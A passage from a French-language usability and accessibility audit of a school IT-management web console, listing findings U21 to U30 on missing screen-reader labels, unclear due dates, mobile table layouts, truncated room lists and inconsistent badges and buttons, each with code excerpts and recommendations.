**Scénario.** PC-A12-07 est introuvable (volé ou déplacé). Le technicien décoche la ligne pour ne pas mentir sur la maintenance, mais ne peut pas écrire « poste absent de la salle » sur cette ligne. La fiche du poste ne garde aucune trace du constat, et le poste reste « En retard » sans explication pour le collègue suivant.

**Recommandation.** Laisser le champ actif pour les postes décochés et envoyer ces notes à part, par exemple sous forme d'intervention de type « Autre » ou « Vérification » liée à la séance. À défaut, préciser dans l'aide que la note d'un poste décoché n'est pas enregistrée.

<a id="u21"></a>

#### U21 — Cases à cocher du dialogue de séance sans libellé accessible

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/maintenance/MaintenanceSessionDialog.vue:50`

La case de chaque ligne et la case « tout cocher » de l'en-tête n'ont ni label ni aria-label. Un lecteur d'écran annonce « case à cocher, cochée » sans nom de poste. Pourtant, le champ de note voisin a bien un aria-label.

```
<q-checkbox :model-value="allDone" dense @update:model-value="(v) => toggleAll(v === true)" />
...
<td><q-checkbox v-model="row.done" dense /></td>
```

**Scénario.** Un utilisateur au clavier ou au lecteur d'écran parcourt les 30 lignes avec Tab. Il entend 30 fois « case à cocher cochée » sans pouvoir identifier le poste, puis « Note pour PC-A12-01 ». Il ne peut pas décocher le bon poste avec certitude.

**Recommandation.** Ajouter `:aria-label="`${row.hostname} fait`"` sur chaque case et `aria-label="Tout cocher / tout décocher"` sur celle de l'en-tête.

<a id="u22"></a>

#### U22 — Échéances peu lisibles : date passée affichée comme « prochaine échéance », à la seconde, sans durée de retard

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/TasksPage.vue:135`

Pour une salle en retard, l'en-tête affiche « prochaine échéance » suivi de la date la plus ancienne, qui est déjà passée. Les badges de poste donnent la date d'échéance au format toLocaleString complet, secondes comprises, au lieu de la durée du retard. Le technicien doit calculer lui-même depuis combien de temps le poste est en retard pour prioriser.

```
{{ r.next_due_at ? ` · prochaine échéance ${formatDateTime(r.next_due_at)}` : '' }}
...
return m.due_at ? `${label} · ${formatDateTime(m.due_at)}` : label;
// utils/format.ts
return new Date(value).toLocaleString('fr-FR');
```

**Scénario.** Capture MesTaches.png : « A12 … prochaine échéance 23/07/2026 00:39:32 » à côté de « 8 en retard », et huit badges identiques « En retard · 23/07/2026 00:39:32 ». Entre deux salles en retard, rien n'indique d'un coup d'œil laquelle l'est depuis 4 mois et laquelle depuis 2 jours.

**Recommandation.** Afficher « en retard depuis N jours » (ou « échue le 23/07/2026 ») quand la date est passée, garder « prochaine échéance » pour une date future, et formater les échéances en date seule (jour/mois/année) sans heure.

<a id="u23"></a>

#### U23 — Sur téléphone, le bouton « Clore » des vérifications est hors écran dans un tableau à défilement horizontal

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `frontend/src/pages/TasksPage.vue:28` · aussi : `frontend/src/pages/RoomsPage.vue:1`

La liste des vérifications est une q-table à 5 colonnes, sans mode grille ni cartes sur petit écran (aucune utilisation de `grid` ou de `$q.screen` dans les pages). La colonne Consignes peut atteindre 420 px et les actions sont dans la dernière colonne. La table de la salle (RoomDetailPage) et le tableau du dialogue de séance (3 colonnes avec un champ de saisie) ont la même structure. Sur un téléphone de 360 px, il faut faire défiler horizontalement chaque ligne pour atteindre « Clore ». De plus, un tap sur la ligne ailleurs que sur le lien déclenche @row-click et quitte la page.

```
<q-table :rows="rows" :columns="columns" ... @row-click="(_evt, row) => goMachine(row)">
  <template #body-cell-instructions="props">
    <q-td :props="props" style="white-space: pre-line; max-width: 420px">
```

**Scénario.** Un technicien en salle ouvre Mes tâches sur son téléphone pour clore une vérification. Il voit le nom du poste et le début des consignes. En glissant horizontalement pour atteindre « Clore », un tap mal placé ouvre la fiche du poste, et il doit revenir en arrière.

**Recommandation.** Passer la q-table en `:grid="$q.screen.lt.sm"`, avec un slot item en carte qui met « Clore » en évidence, ou présenter les vérifications en q-list comme les maintenances. Sur mobile, retirer @row-click au profit du lien explicite.

*Signalé aussi sous un autre angle :* Aucune adaptation mobile des tableaux : en 390 px, Salles, Tâches et Audit n'affichent qu'une colonne et masquent leurs actions

<a id="u24"></a>

#### U24 — Salle de plus de 200 postes : liste et séance de maintenance tronquées sans avertissement

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `frontend/src/pages/RoomDetailPage.vue:415`

La page de salle charge les postes en une seule requête plafonnée à 200 (limite imposée par le serveur, le=200), sans pagination (hide-pagination) et sans exploiter `total`. Le dialogue « Effectuer la maintenance » est construit à partir de cette liste tronquée.

```
listMachines({ room_id: props.id, sort_by: 'hostname', sort_desc: false, page_size: 200 }),
...
const sessionMachines = computed(() => machines.value.map((m) => ({ ... })));
```

**Scénario.** Une salle venue de l'annuaire (OU « Labo » de 260 postes) affiche « Postes 260 » dans la carte, mais le tableau n'en montre que 200. Une séance de maintenance « pour toute la salle » n'enregistre que 200 postes, et les 60 derniers par ordre alphabétique restent en retard.

**Recommandation.** Paginer, ou boucler sur les pages jusqu'à `total`. À défaut, afficher un avertissement quand list.total > list.items.length.

<a id="u25"></a>

#### U25 — Liste des postes : la mise en page par défaut fait plus de 2 200 px de large, et les colonnes de supervision (Antivirus, MAJ Windows, Session, Vu le) sont hors écran en 1440 px

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `frontend/src/components/machines-list/MachinesTable.vue:2`

La mise en page par défaut affiche les 15 colonnes du catalogue, dans l'ordre suivant : Nom, Domaine, Emplacement, Bâtiment, Salle, Maintenance, IP, OS, Agent, Antivirus, MAJ Windows, Session, Modèle, Disque, Vu le. Mesuré dans le navigateur, le tableau fait de 2 234 à 2 904 px de large selon les données (noms d'OS, de domaine et de modèle). Sur un écran de bureau de 1440 px, seules les premières colonnes sont visibles (1 092 px utiles) : de Nom à une partie de Bâtiment avec des valeurs longues, jusqu'à Adresse IP avec des valeurs courtes. Les colonnes qui servent au suivi quotidien (Antivirus, MAJ Windows, Session, Vu le) commencent au mieux 270 px au-delà du bord visible, et jusqu'à plus de 1 800 px, et ne s'atteignent que par un défilement horizontal interne au tableau, sans indice visuel. Même en 1920 px, de la moitié à 70 % du tableau est visible, et MAJ Windows, Session et Vu le restent en partie ou totalement hors écran. En 390 px, seule la colonne Nom apparaît. La colonne Nom elle-même s'élargit à 398 px dès qu'un nom d'hôte est long.

```
export const DEFAULT_MACHINE_COLUMNS: MachineColumnKey[] = MACHINE_COLUMN_KEYS.filter(
  (key) => !OPTIONAL_MACHINE_COLUMNS.includes(key),
);  // utils/machineColumns.ts:48 — mesure Playwright à 1440px : {"sw":2904,"cw":1092}
```

**Scénario.** Un administrateur ouvre /machines sur un écran 1440×900 pour voir quels postes ont un antivirus périmé. L'écran (capture machines-desk.png) ne montre ni le badge antivirus, ni la date du dernier contact, ni la session : il faut faire défiler le tableau de plusieurs centaines à près de 2 000 px vers la droite, ligne d'en-tête comprise. En mobile (machines-mob.png), seul le nom est visible et le nom long « PC-LYCEE-B204-003-POSTE-PROFESSEUR-PRINCIPAL » est coupé sans points de suspension.

**Recommandation.** Réduire la mise en page par défaut à un jeu court centré sur la supervision, par exemple Nom, Salle, Antivirus, MAJ Windows, Session, Vu le. Laisser Domaine, Emplacement, OS, Modèle et IP au choix via « Colonnes ». Rendre la première colonne collante (sticky) et limiter sa largeur avec text-overflow: ellipsis. En petit écran (`$q.screen.lt.md`), passer le QTable en mode `grid` avec une carte par poste.

<a id="u26"></a>

#### U26 — « Mes tâches » : dès que le libellé de lieu est long, la colonne Consignes est écrasée à 116 px et le bouton « Clore » est coupé en 1440 px

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `frontend/src/pages/TasksPage.vue:57`

Les cellules d'un QTable sont en `white-space: nowrap` par défaut. La colonne Poste, qui contient le nom et le libellé « Bâtiment › Salle · Emplacement », ne se replie donc pas : elle prend 556 px avec un libellé de lieu d'environ 85 caractères, contre 227 px avec un libellé court, cas où la mise en page reste saine en 1440 px. En 390 px, le défaut se reproduit avec des données ordinaires. Seule la cellule Consignes passe en `pre-line`, avec un simple `max-width: 420px` sans largeur minimale. Le navigateur la réduit donc à 116 px. Une consigne de 180 caractères tient alors sur 13 lignes : chaque ligne du tableau fait environ 270 px de haut, et 6 tâches occupent toute la hauteur de la page. Le tableau dépasse aussi sa boîte (1 146 px de contenu pour 1 090 px visibles), si bien que le bouton « Clore » (x = 1349→1433) dépasse le bord droit du tableau (1415) et apparaît tronqué en « CLO ».

```
<q-td :props="props" style="white-space: pre-line; max-width: 420px">
  {{ props.value || '—' }}
</q-td>
— mesure à 1440px : th = ["Poste:556","Consignes:116",…], clore:[1349,1433], bord droit du tableau 1415
```

**Scénario.** Un technicien ouvre /tasks sur un portable 1440 px avec 6 vérifications créées en masse avec une consigne de deux phrases (capture tasks-desk.png). La consigne est coupée mot par mot sur une colonne étroite, la page fait plus de 2 000 px de haut et l'action principale « Clore » est à moitié cachée derrière un défilement horizontal. En 390 px (tasks-mob.png), seules les colonnes Poste sont visibles, le bouton Clore est à x ≈ 1033 px et les lignes restent vides sur 270 px de haut.

**Recommandation.** Donner à la colonne Consignes une largeur minimale (par exemple `min-width: 280px`, via `headerStyle` et `style` dans la définition de colonne). Replier le libellé de lieu de la colonne Poste (`white-space: normal`, ou ellipsis avec infobulle). Rendre la colonne d'actions collante à droite, ou mettre le bouton « Clore » dans la cellule Poste en mobile. En petit écran, présenter chaque vérification comme une carte (mode `grid`), comme le fait déjà la section « Maintenances à faire ».

<a id="u27"></a>

#### U27 — Paramètres › Réglages du serveur : en mobile, les clés en `nowrap` réduisent la description à une colonne étroite et tronquée

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/SettingsPage.vue:916`

La cellule `.env-key` est en `white-space: nowrap` et contient des clés en police à chasse fixe comme `MAINTENANCE_REMINDER_WEEKDAY` ou `ENROLLMENT_REENROLL_REQUIRES_APPROVAL`. En 390 px, la clé occupe presque toute la largeur. La description, dans un tableau `wrap-cells`, se replie alors sur 60 à 110 px selon le groupe de réglages, un ou deux mots par ligne, et ses derniers caractères sont coupés au bord (« le token d'un », « Cycle pa ») ; dans les groupes aux clés les plus longues, elle passe presque entièrement derrière un défilement horizontal. La page Paramètres atteint 10 643 px de haut en mobile, contre 5 342 px en bureau.

```
.env-key {
  width: 30%;
  white-space: nowrap;
}
— mesure à 390px : env-table {"sw":391,"cw":372}
```

**Scénario.** Un administrateur ouvre /settings sur mobile pour vérifier pourquoi un poste est signalé (settings-mob.png et crop-set-mob.png). Les descriptions des variables, qui sont la raison d'être de ce tableau, deviennent des colonnes d'un mot de large, partiellement coupées au bord droit.

**Recommandation.** En dessous de `sm`, empiler les trois cellules : la clé et la valeur sur une ligne, la description en dessous sur toute la largeur. Autre option : retirer le `nowrap` et autoriser `word-break: break-all` sur la clé en mobile.

<a id="u28"></a>

#### U28 — Badge antivirus vert alors que le libellé dit « Non relevé » (ou « Aucun »)

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/machine/MachineStatusCard.vue:7`

La couleur du badge vient de l'état global `is_up_to_date` (protectionColor), alors que le texte est le nom du produit Security Center (antivirusLabel). Quand Defender protège mais que le Security Center n'a jamais été relevé (agent ancien, Windows Server), la fiche affiche un badge vert « Non relevé ». La couleur dit « tout va bien » et le texte dit « pas de mesure ». Si le registre est vide (`''` → « Aucun »), le badge peut être vert « Aucun » pour un poste protégé par Defender, alors que `antivirusColor` (format.ts) prévoit précisément du rouge pour ce cas, mais n'est utilisé ni ici ni dans MachinesTable.vue:119.

```
<q-badge :color="protectionColor(machine.is_up_to_date)" class="q-mt-xs">
  {{ antivirusLabel(machine.av_product_name) }}
</q-badge>
```

**Scénario.** Fiche PC-LYCEE-ADM-023 (machine-desk.png) : Defender est actif et à jour, aucun av_product n'est remonté. La carte de tête affiche un badge vert « Non relevé » au-dessus de « À jour ». Un opérateur ne sait pas si le produit antivirus est connu ou non.

**Recommandation.** Séparer les deux informations. Garder le badge coloré pour l'état (« À jour », « Périmé ») et afficher le nom du produit en texte, ou colorer le badge du produit avec `antivirusColor` (gris pour « Non relevé », rouge pour « Aucun »).

<a id="u29"></a>

#### U29 — En mobile, le titre « Tia'i — Console » est tronqué en « Tia'i … » par l'adresse e-mail affichée en permanence

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/layouts/MainLayout.vue:10`

L'adresse e-mail de l'utilisateur est toujours affichée dans la barre d'en-tête, quelle que soit la largeur. En 390 px, elle prend la place du q-toolbar-title, qui se réduit à « Tia'i … » sur toutes les pages (voir les captures *-mob.png). Une adresse plus longue (prenom.nom@etablissement.example) ne laisserait plus que l'icône.

```
<div v-if="auth.user" class="text-caption q-mr-sm">{{ auth.user.email }}</div>
```

**Scénario.** Sur un téléphone de 390 px, toutes les pages de la console affichent « Tia'i … » à côté de l'adresse admin@example.org. Avec une adresse de 30 caractères, le nom de l'application disparaît.

**Recommandation.** Masquer l'e-mail en petit écran (`class="gt-xs"`) et le montrer dans l'infobulle ou le menu du bouton « Mon compte ».

<a id="u30"></a>

#### U30 — Fiche poste : boutons d'en-tête incohérents, « Logiciel » en casse normale et les autres en majuscules

**Sévérité :** Info · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachineDetailPage.vue:119`

Dans la même barre d'actions, seul le bouton « Logiciel » porte `no-caps`. Les boutons voisins s'affichent en majuscules (« ACTION », « CHANGER DE SALLE », « FUSIONNER », « RÉVOQUER LE TOKEN »). Le même mélange apparaît dans le bandeau de vérification (« RÉAFFECTER / MODIFIER », « CLORE ») et ailleurs : 38 occurrences de `no-caps` sont réparties de façon irrégulière dans l'application. En mobile, la barre se répartit sur trois lignes de styles différents.

```
no-caps
        ...
        label="Logiciel"   (l.119-122) — alors que label="Révoquer le token" (l.189) n'a pas no-caps
```

**Scénario.** Capture machine-desk.png : « Logiciel » apparaît en minuscules entre « ACTION » et « CHANGER DE SALLE », comme s'il s'agissait d'un lien d'une autre nature.

**Recommandation.** Choisir une convention unique, par exemple `no-caps` global via `framework.config.btn` ou une classe commune, et l'appliquer à tous les boutons de la barre.

